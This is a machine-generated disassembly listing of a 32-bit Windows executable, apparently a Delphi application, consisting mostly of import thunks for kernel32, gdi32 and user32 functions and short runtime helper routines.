jmp [ GlobalLock@IAT ]
GlobalHandle
jmp [ GlobalHandle@IAT ]
GlobalReAlloc
jmp [ GlobalReAlloc@IAT ]
GlobalUnlock
jmp [ __import_lookup_table_6(kernel32:GlobalUnlock) ]
LeaveCriticalSection
jmp [ LeaveCriticalSection@IAT ]
LoadLibraryA
jmp [ LoadLibraryA@IAT ]
LoadResource
jmp [ LoadResource@IAT ]
LockResource
jmp [ __import_lookup_table_6(kernel32:LockResource) ]
ReadFile
jmp [ __import_lookup_table_6(kernel32:ReadFile) ]
ResetEvent
jmp [ __import_lookup_table_6(kernel32:ResetEvent) ]
SetEndOfFile
jmp [ __import_lookup_table_6(kernel32:SetEndOfFile) ]
SetEvent
jmp [ __import_lookup_table_6(kernel32:SetEvent) ]
SetFilePointer
jmp [ __import_lookup_table_6(kernel32:SetFilePointer) ]
SetThreadLocale
jmp [ SetThreadLocale@IAT ]
SizeofResource
jmp [ SizeofResource@IAT ]
sub_406170
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
VirtualAlloc
jmp [ VirtualAlloc@IAT ]
VirtualQuery
jmp [ VirtualQuery@IAT ]
WaitForSingleObject
jmp [ __import_lookup_table_6(kernel32:WaitForSingleObject) ]
lstrcpyA
jmp [ lstrcpyA@IAT ]
GetFileVersionInfoA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoA) ]
GetFileVersionInfoSizeA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoSizeA) ]
VerQueryValueA
jmp [ VerQueryValueA@IAT ]
Arc
jmp [ Arc@IAT ]
CopyEnhMetaFileA
jmp [ __import_lookup_table_8(gdi32:CopyEnhMetaFileA) ]
CreateBitmap
jmp [ __import_lookup_table_8(gdi32:CreateBitmap) ]
CreateBrushIndirect
jmp [ __import_lookup_table_8(gdi32:CreateBrushIndirect) ]
CreateDIBSection
jmp [ __import_lookup_table_8(gdi32:CreateDIBSection) ]
CreateDIBitmap
jmp [ __import_lookup_table_8(gdi32:CreateDIBitmap) ]
CreateHalftonePalette
jmp [ __import_lookup_table_8(gdi32:CreateHalftonePalette) ]
CreatePalette
jmp [ CreatePalette@IAT ]
CreatePenIndirect
jmp [ __import_lookup_table_8(gdi32:CreatePenIndirect) ]
CreatePolygonRgn
jmp [ __import_lookup_table_8(gdi32:CreatePolygonRgn) ]
CreateRectRgn
jmp [ CreateRectRgn@IAT ]
DeleteEnhMetaFile
jmp [ DeleteEnhMetaFile@IAT ]
ExcludeClipRect
jmp [ __import_lookup_table_8(gdi32:ExcludeClipRect) ]
ExtCreatePen
jmp [ ExtCreatePen@IAT ]
ExtSelectClipRgn
jmp [ __import_lookup_table_8(gdi32:ExtSelectClipRgn) ]
GetBkColor
jmp [ __import_lookup_table_8(gdi32:GetBkColor) ]
GetBkMode
jmp [ GetBkMode@IAT ]
GetBrushOrgEx
jmp [ GetBrushOrgEx@IAT ]
GetClipBox
jmp [ GetClipBox@IAT ]
GetCurrentPositionEx
jmp [ GetCurrentPositionEx@IAT ]
GetDCOrgEx
jmp [ GetDCOrgEx@IAT ]
GetDIBColorTable
jmp [ GetDIBColorTable@IAT ]
GetEnhMetaFileHeader
jmp [ __import_lookup_table_8(gdi32:GetEnhMetaFileHeader) ]
GetPixel
jmp [ GetPixel@IAT ]
GetTextAlign
jmp [ GetTextAlign@IAT ]
GetTextExtentPoint32A
jmp [ GetTextExtentPoint32A@IAT ]
GetTextMetricsA
jmp [ GetTextMetricsA@IAT ]
GetWindowOrgEx
jmp [ GetWindowOrgEx@IAT ]
LPtoDP
jmp [ LPtoDP@IAT ]
LineTo
jmp [ __import_lookup_table_8(gdi32:LineTo) ]
MaskBlt
jmp [ __import_lookup_table_8(gdi32:MaskBlt) ]
MoveToEx
jmp [ __import_lookup_table_8(gdi32:MoveToEx) ]
Pie
jmp [ __import_lookup_table_8(gdi32:Pie) ]
PlayEnhMetaFile
jmp [ __import_lookup_table_8(gdi32:PlayEnhMetaFile) ]
RectVisible
jmp [ __import_lookup_table_8(gdi32:RectVisible) ]
Rectangle
jmp [ __import_lookup_table_8(gdi32:Rectangle) ]
RoundRect
jmp [ __import_lookup_table_8(gdi32:RoundRect) ]
ScaleWindowExtEx
jmp [ __import_lookup_table_8(gdi32:ScaleWindowExtEx) ]
SelectClipRgn
jmp [ __import_lookup_table_8(gdi32:SelectClipRgn) ]
SetBrushOrgEx
jmp [ SetBrushOrgEx@IAT ]
SetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:SetDIBColorTable) ]
SetEnhMetaFileBits
jmp [ __import_lookup_table_8(gdi32:SetEnhMetaFileBits) ]
SetPixel
jmp [ __import_lookup_table_8(gdi32:SetPixel) ]
SetROP2
jmp [ __import_lookup_table_8(gdi32:SetROP2) ]
SetTextAlign
jmp [ SetTextAlign@IAT ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
TextOutA
jmp [ TextOutA@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ __import_lookup_table_9(user32:ActivateKeyboardLayout) ]
AdjustWindowRectEx
jmp [ AdjustWindowRectEx@IAT ]
CharLowerA
jmp [ __import_lookup_table_9(user32:CharLowerA) ]
BeginDeferWindowPos
jmp [ __import_lookup_table_9(user32:BeginDeferWindowPos) ]
BeginPaint
jmp [ __import_lookup_table_9(user32:BeginPaint) ]
CallNextHookEx
jmp [ __import_lookup_table_9(user32:CallNextHookEx) ]
CallWindowProcA
jmp [ CallWindowProcA@IAT ]
CharLowerBuffA
jmp [ __import_lookup_table_9(user32:CharLowerBuffA) ]
CharNextA
jmp [ __import_lookup_table_9(user32:CharNextA) ]
CharToOemA
jmp [ CharToOemA@IAT ]
CharUpperBuffA
jmp [ CharUpperBuffA@IAT ]
CheckMenuItem
jmp [ CheckMenuItem@IAT ]
ClientToScreen
jmp [ __import_lookup_table_9(user32:ClientToScreen) ]
CreateIcon
jmp [ __import_lookup_table_9(user32:CreateIcon) ]
CreateMenu
jmp [ CreateMenu@IAT ]
CreatePopupMenu
jmp [ __import_lookup_table_9(user32:CreatePopupMenu) ]
DefFrameProcA
jmp [ __import_lookup_table_9(user32:DefFrameProcA) ]
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
DeferWindowPos
jmp [ DeferWindowPos@IAT ]
DestroyIcon
jmp [ DestroyIcon@IAT ]
DestroyMenu
jmp [ __import_lookup_table_9(user32:DestroyMenu) ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
DispatchMessageA
jmp [ DispatchMessageA@IAT ]
DrawFrameControl
jmp [ __import_lookup_table_9(user32:DrawFrameControl) ]
DrawIcon
jmp [ DrawIcon@IAT ]
DrawIconEx
jmp [ __import_lookup_table_9(user32:DrawIconEx) ]
DrawMenuBar
jmp [ __import_lookup_table_9(user32:DrawMenuBar) ]
EnableWindow
jmp [ __import_lookup_table_9(user32:EnableWindow) ]
EndDeferWindowPos
jmp [ __import_lookup_table_9(user32:EndDeferWindowPos) ]
EndPaint
jmp [ __import_lookup_table_9(user32:EndPaint) ]
EnumThreadWindows
jmp [ __import_lookup_table_9(user32:EnumThreadWindows) ]
EnumWindows
jmp [ __import_lookup_table_9(user32:EnumWindows) ]
EqualRect
jmp [ __import_lookup_table_9(user32:EqualRect) ]
FindWindowA
jmp [ FindWindowA@IAT ]
GetClassNameA
jmp [ GetClassNameA@IAT ]
GetClientRect
jmp [ __import_lookup_table_9(user32:GetClientRect) ]
GetClipboardData
jmp [ GetClipboardData@IAT ]
GetCursor
jmp [ __import_lookup_table_9(user32:GetCursor) ]
GetDC
jmp [ GetDC@IAT ]
GetDCEx
jmp [ __import_lookup_table_9(user32:GetDCEx) ]
GetDlgItem
jmp [ __import_lookup_table_9(user32:GetDlgItem) ]
GetForegroundWindow
jmp [ __import_lookup_table_9(user32:GetForegroundWindow) ]
GetIconInfo
jmp [ GetIconInfo@IAT ]
GetKeyNameTextA
jmp [ __import_lookup_table_9(user32:GetKeyNameTextA) ]
GetKeyboardLayout
jmp [ GetKeyboardLayout@IAT ]
GetKeyboardLayoutList
jmp [ GetKeyboardLayoutList@IAT ]
GetKeyboardState
jmp [ __import_lookup_table_9(user32:GetKeyboardState) ]
GetLastActivePopup
jmp [ __import_lookup_table_9(user32:GetLastActivePopup) ]
GetMenu
jmp [ __import_lookup_table_9(user32:GetMenu) ]
GetMenuItemID
jmp [ __import_lookup_table_9(user32:GetMenuItemID) ]
GetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:GetMenuItemInfoA) ]
GetMenuStringA
jmp [ GetMenuStringA@IAT ]
__imp_GetWindow
jmp [ GetWindow@IAT ]
GetParent
jmp [ __import_lookup_table_9(user32:GetParent) ]
GetPropA
jmp [ GetPropA@IAT ]
GetSubMenu
jmp [ __import_lookup_table_9(user32:GetSubMenu) ]
GetSysColor
jmp [ __import_lookup_table_9(user32:GetSysColor) ]
GetSysColorBrush
jmp [ __import_lookup_table_9(user32:GetSysColorBrush) ]
GetSystemMenu
jmp [ __import_lookup_table_9(user32:GetSystemMenu) ]
GetTopWindow
jmp [ __import_lookup_table_9(user32:GetTopWindow) ]
GetWindow
jmp [ GetWindow@IAT ]
GetWindowDC
jmp [ __import_lookup_table_9(user32:GetWindowDC) ]
GetWindowPlacement
jmp [ GetWindowPlacement@IAT ]
GetWindowRect
jmp [ __import_lookup_table_9(user32:GetWindowRect) ]
GetWindowTextA
jmp [ __import_lookup_table_9(user32:GetWindowTextA) ]
__imp_GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
InsertMenuItemA
jmp [ __import_lookup_table_9(user32:InsertMenuItemA) ]
IsChild
jmp [ IsChild@IAT ]
IsDialogMessageA
jmp [ __import_lookup_table_9(user32:IsDialogMessageA) ]
IsRectEmpty
jmp [ __import_lookup_table_9(user32:IsRectEmpty) ]
IsWindow
jmp [ IsWindow@IAT ]
IsWindowEnabled
jmp [ IsWindowEnabled@IAT ]
IsZoomed
jmp [ IsZoomed@IAT ]
KillTimer
jmp [ KillTimer@IAT ]
LoadBitmapA
jmp [ LoadBitmapA@IAT ]
LoadIconA
jmp [ __import_lookup_table_9(user32:LoadIconA) ]
LoadStringA
jmp [ LoadStringA@IAT ]
MapVirtualKeyA
jmp [ MapVirtualKeyA@IAT ]
MessageBoxA
jmp [ __import_lookup_table_9(user32:MessageBoxA) ]
OemToCharA
jmp [ OemToCharA@IAT ]
PeekMessageA
jmp [ PeekMessageA@IAT ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
PtInRect
jmp [ __import_lookup_table_9(user32:PtInRect) ]
RedrawWindow
jmp [ __import_lookup_table_9(user32:RedrawWindow) ]
RegisterClassA
jmp [ __import_lookup_table_9(user32:RegisterClassA) ]
RegisterClipboardFormatA
jmp [ __import_lookup_table_9(user32:RegisterClipboardFormatA) ]
ReleaseCapture
jmp [ __import_lookup_table_9(user32:ReleaseCapture) ]
ReleaseDC
jmp [ ReleaseDC@IAT ]
RemoveMenu
jmp [ RemoveMenu@IAT ]
ScrollWindow
jmp [ __import_lookup_table_9(user32:ScrollWindow) ]
SetActiveWindow
jmp [ SetActiveWindow@IAT ]
SetCapture
jmp [ __import_lookup_table_9(user32:SetCapture) ]
SetClassLongA
jmp [ SetClassLongA@IAT ]
SetForegroundWindow
jmp [ SetForegroundWindow@IAT ]
SetMenuItemInfoA
jmp [ SetMenuItemInfoA@IAT ]
SetParent
jmp [ __import_lookup_table_9(user32:SetParent) ]
SetTimer
jmp [ SetTimer@IAT ]
SetWindowPlacement
jmp [ SetWindowPlacement@IAT ]
SetWindowsHookExA
jmp [ SetWindowsHookExA@IAT ]
ShowCursor
jmp [ ShowCursor@IAT ]
ShowOwnedPopups
jmp [ ShowOwnedPopups@IAT ]
TrackPopupMenu
jmp [ __import_lookup_table_9(user32:TrackPopupMenu) ]
TranslateMDISysAccel
jmp [ __import_lookup_table_9(user32:TranslateMDISysAccel) ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ __import_lookup_table_9(user32:UnhookWindowsHookEx) ]
UnregisterClassA
jmp [ __import_lookup_table_9(user32:UnregisterClassA) ]
UpdateWindow
jmp [ __import_lookup_table_9(user32:UpdateWindow) ]
WaitMessage
jmp [ __import_lookup_table_9(user32:WaitMessage) ]
WinHelpA
jmp [ __import_lookup_table_9(user32:WinHelpA) ]
WindowFromPoint
jmp [ WindowFromPoint@IAT ]
sub_40696c
call GetTickCount
retn
sub_406974
xor eax eax
retn
sub_406978
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_406988
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_4069a4
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_4069b8
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_4069c4
and eax 0xff
and edx 0xff
shl edx 0x8
or eax edx
xor edx edx
mov dl cl
shl edx 0x10
or eax edx
retn
sub_406a18
call sub_406960
retn
CreateWindowExA
jmp [ CreateWindowExA@IAT ]
sub_406bf5
jmp sub_4038ec
sub_406bfc
pop ebp
retn
sub_406c00
sub [ rw-data ] 0x1
retn
sub_406c2d
jmp sub_4038ec
sub_406c34
pop ebp
retn
sub_406c38
sub [ rw-data ] 0x1
retn
sub_406f4d
jmp sub_4038ec
sub_406f54
pop ebp
retn
sub_406f58
sub [ rw-data ] 0x1
retn
sub_406fa5
xor eax [ eax ]
hlt
sub_407069
xor eax [ eax ]
hlt
sub_4070c5
xor eax [ eax ]
hlt
sub_407175
xor eax [ eax ]
hlt
sub_407285
xor eax [ eax ]
hlt
sub_4074f1
xor eax [ eax ]
hlt
sub_4075a9
xor eax [ eax ]
hlt
sub_407605
xor eax [ eax ]
hlt
sub_407771
xor eax [ eax ]
hlt
sub_4077cd
xor eax [ eax ]
hlt
sub_40782d
xor eax [ eax ]
hlt
sub_4078e5
xor eax [ eax ]
hlt
sub_407a25
add eax 0xffffffd4
jmp sub_40d344
sub_407a2d
add eax 0xffffffd4
jmp sub_40d1ec
sub_407a35
add eax 0xffffffd4
jmp sub_40d288
sub_407a47
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405708
sub_407a51
add [ esp + 0x4 ] 0xffffffd4
jmp sub_40571c
sub_407b28
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_403924
pop ebx
retn
sub_407e00
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_407dc8
test eax eax
sete al
pop esi
pop ebx
retn
sub_40835e
jmp sub_4038ec
sub_408365
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40836c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4082f8
pop esi
pop ebx
retn
sub_4083fc
call sub_4083d8
retn
sub_408494
push eax
call CloseHandle
retn
sub_408504
push ebx
mov ebx eax
mov eax ebx
call sub_40849c
inc eax
setne al
pop ebx
retn
sub_4086dc
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_4086f0
push esi
mov esi eax
xchg edx eax
call sub_4028d8
mov eax esi
pop esi
retn
sub_4088b0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_4040e0
pop esi
pop ebx
retn
sub_4088c4
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_4026dc
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_4088d8
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_408910
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_4026fc
sub_408978
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402838
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_40899c
push ebx
mov ebx eax
mov eax ebx
call sub_403ee8
pop ebx
retn
sub_408cff
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_403ee8
pop eax
pop ebx
retn
sub_408fb7
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_409112
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_409763
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_409763
sub_409878
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4043a8
mov edx esi
xor ecx ecx
call sub_4096ac
pop esi
pop ebx
retn
sub_4098ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4043a8
mov edx esi
mov cl 0x1
call sub_4096ac
pop esi
pop ebx
retn
sub_409fc2
jmp sub_4038ec
sub_409fc9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a0ba
jmp sub_4038ec
sub_40a0c1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a865
jmp sub_4038ec
sub_40a86c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a8f4
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a898
pop ebp
retn 0x8
sub_40aa39
jmp sub_4038ec
sub_40aa40
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40aee3
jmp sub_4038ec
sub_40aeea
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b3cf
jmp sub_4038ec
sub_40b3d6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b481
jmp sub_4038ec
sub_40b488
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40b52b
jmp sub_4038ec
sub_40b532
pop esi
pop ecx
pop ebp
retn
sub_40b70e
jmp sub_4038ec
sub_40b715
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b76c
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40ba5e
jmp sub_4038ec
sub_40bb2c
jmp sub_4038ec
sub_40bb54
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_40314c
sub_40bc50
pop ebx
retn
sub_40bcf0
jmp sub_4038ec
sub_40bcf7
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40bd00
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_403924
sub_40bd0d
retn
sub_40bd10
push ebp
mov ebp esp
call sub_40bc54
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40bd00
pop ebp
retn 0x4
sub_40bd2c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_403924
retn
sub_40bdc4
push ebx
mov ebx eax
mov eax ebx
call sub_40bd44
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40bf97
jmp sub_4038ec
sub_40bf9e
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40c063
jmp sub_4038ec
sub_40c06a
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c074
call sub_40b900
mov eax 0x1
call sub_403ed0
sub_40c1f8
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40c2d1
jmp sub_4038ec
sub_40c2ee
jmp sub_4038ec
sub_40c2f5
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40c3a0
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40c304
mov ecx eax
sub_40c58c
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40c5ac
push eax
call CharNextA
retn
sub_40c8d4
jmp sub_4038ec
sub_40c8db
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c944
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40cd9b
jmp sub_4038ec
sub_40cda2
pop ebx
mov esp ebp
pop ebp
retn
Sleep
jmp [ __import_lookup_table_10(kernel32:Sleep) ]
sub_40cee0
jmp sub_4038ec
sub_40cee7
pop ebx
mov esp ebp
pop ebp
retn
sub_40ceec
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40ce50
sub_40cefc
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40cf18
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_4026fc
pop ebx
retn
sub_40cfa0
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40cfac
xchg [ eax ] edx
mov eax edx
retn
sub_40d00c
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40d09c
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40d1b4
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40d1dc
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40d457
jmp sub_4038ec
sub_40d45e
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40d4cc
jmp sub_4038ec
sub_40d4d3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d4f1
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40d4ea
jmp sub_4038ec
sub_40d4f1
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40d4fc
sbb eax 0x8000000
mov bl 0x47
add [ eax + 0x47c2 ] cl
mov bl 0x47
add [ ecx + eax * 8 - 0x4d07ffb9 ] al
inc edi
add al ah
mov edi 0xb2f00047
inc edi
add ah bl
retn 0x47
sub_40d566
inc edi
add [ eax + 0x3c0047b2 ] ah
rol [ edi ] 0x98
mov dl 0x47
add [ esp + eax * 8 ] cl
inc edi
add [ eax + 0x600047b2 ] dl
retn 0x47
sub_40d5c8
inc eax
mov dl 0x47
add ah dl
retn 0x47
sub_40d66c
add [ eax ] al
add [ eax ] al
hlt
sub_40d9b4
jmp sub_4038ec
sub_40d9bb
pop ebp
retn
VariantInit
jmp [ __import_lookup_table_11(oleaut32:VariantInit) ]
VariantChangeType
jmp [ VariantChangeType@IAT ]
sub_40da34
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40da9a
jmp sub_4038ec
sub_40daa1
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40db06
jmp sub_4038ec
sub_40db0d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40db72
jmp sub_4038ec
sub_40db79
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dbde
jmp sub_4038ec
sub_40dbe5
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dc4a
jmp sub_4038ec
sub_40dc51
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dcc9
jmp sub_4038ec
sub_40dcd0
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40dd3c
jmp sub_4038ec
sub_40dd43
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40ddac
jmp sub_4038ec
sub_40ddb3
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40de20
jmp sub_4038ec
sub_40de27
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ SafeArrayCreate@IAT ]
SafeArrayGetLBound
jmp [ SafeArrayGetLBound@IAT ]
SafeArrayGetUBound
jmp [ SafeArrayGetUBound@IAT ]
sub_40e1ad
jmp sub_4038ec
sub_40e1b4
pop ebp
retn
sub_40e1b8
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40de7c
sub_40e1c9
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40e24d
xor eax [ eax ]
hlt
sub_40e319
xor eax [ eax ]
hlt
sub_40e37d
xor eax [ eax ]
hlt
sub_40e3e1
xor eax [ eax ]
hlt
sub_40e445
xor eax [ eax ]
hlt
sub_40e4a9
xor eax [ eax ]
hlt
sub_40e50d
xor eax [ eax ]
hlt
sub_40e571
xor eax [ eax ]
hlt
sub_40e5d9
xor eax [ eax ]
hlt
sub_40e641
xor eax [ eax ]
hlt
sub_40e6a5
xor eax [ eax ]
hlt
sub_40e70d
xor eax [ eax ]
hlt
sub_40e771
xor eax [ eax ]
hlt
sub_40e7ea
jmp sub_4038ec
sub_40e7f1
pop ecx
pop ebp
retn
sub_40e883
jmp sub_4038ec
sub_40e88a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e8da
jmp sub_4038ec
sub_40e8e1
pop ecx
pop ebp
retn
sub_40e973
jmp sub_4038ec
sub_40e97a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e9ca
jmp sub_4038ec
sub_40e9d1
pop ecx
pop ebp
retn
sub_40ec19
jmp sub_4038ec
sub_40ec20
pop ebx
mov esp ebp
pop ebp
retn
sub_40ecb2
jmp sub_4038ec
sub_40ecb9
pop ecx
pop ebp
retn
sub_40ecbc
push ebx
mov ebx eax
mov eax ebx
call sub_40ef54
mov [ ebx ] 0x1
pop ebx
retn
sub_40ef54
test [ eax ] 0xbfe8
jne r-xdata
call sub_40eed8
retn
mov [ eax ] 0x0
retn
sub_40ef68
push eax
call sub_40ef54
pop eax
retn
sub_40f1c8
call sub_40f27c
retn
sub_40f3e6
jmp sub_4038ec
sub_40f3ed
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f491
jmp sub_4038ec
sub_40f498
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f4ba
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4045e0
retn
sub_40f4b3
jmp sub_4038ec
sub_40f4ba
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f516
jmp sub_4038ec
sub_40f51d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f599
jmp sub_4038ec
sub_40fadf
jmp sub_4038ec
sub_40fae6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40fb79
jmp sub_4038ec
sub_40fb80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fb9d
lea eax [ ebp - 0x14 ]
call sub_4045c8
retn
sub_40fb96
jmp sub_4038ec
sub_40fb9d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40fbfa
jmp sub_4038ec
sub_40fc01
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40fca3
jmp sub_4038ec
sub_40fcc0
jmp sub_4038ec
sub_40fcc7
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410222
jmp sub_4038ec
sub_410229
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4102d4
push eax
call sub_40ef54
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_4102e8
push eax
call sub_40ef54
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_410360
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40f27c
add esp 0x10
sub_41060a
jmp sub_4038ec
sub_410611
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_410654
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40ef54
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_41066c
mov edx 0x80020004
call sub_410654
retn
sub_4106fd
jmp sub_4038ec
sub_410704
pop esi
pop ebx
pop ebp
retn
sub_410708
push ebp
mov ebp esp
call sub_4108c8
pop ebp
retn 0x4
sub_410794
push ebp
mov ebp esp
call sub_4108c8
pop ebp
retn 0x4
sub_410877
jmp sub_4038ec
sub_41087e
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403188
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40350c
sub_4108a0
xor eax eax
retn
sub_4108a4
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_4108b8
mov [ ecx ] 0x8
mov al 0x1
retn
sub_4108c0
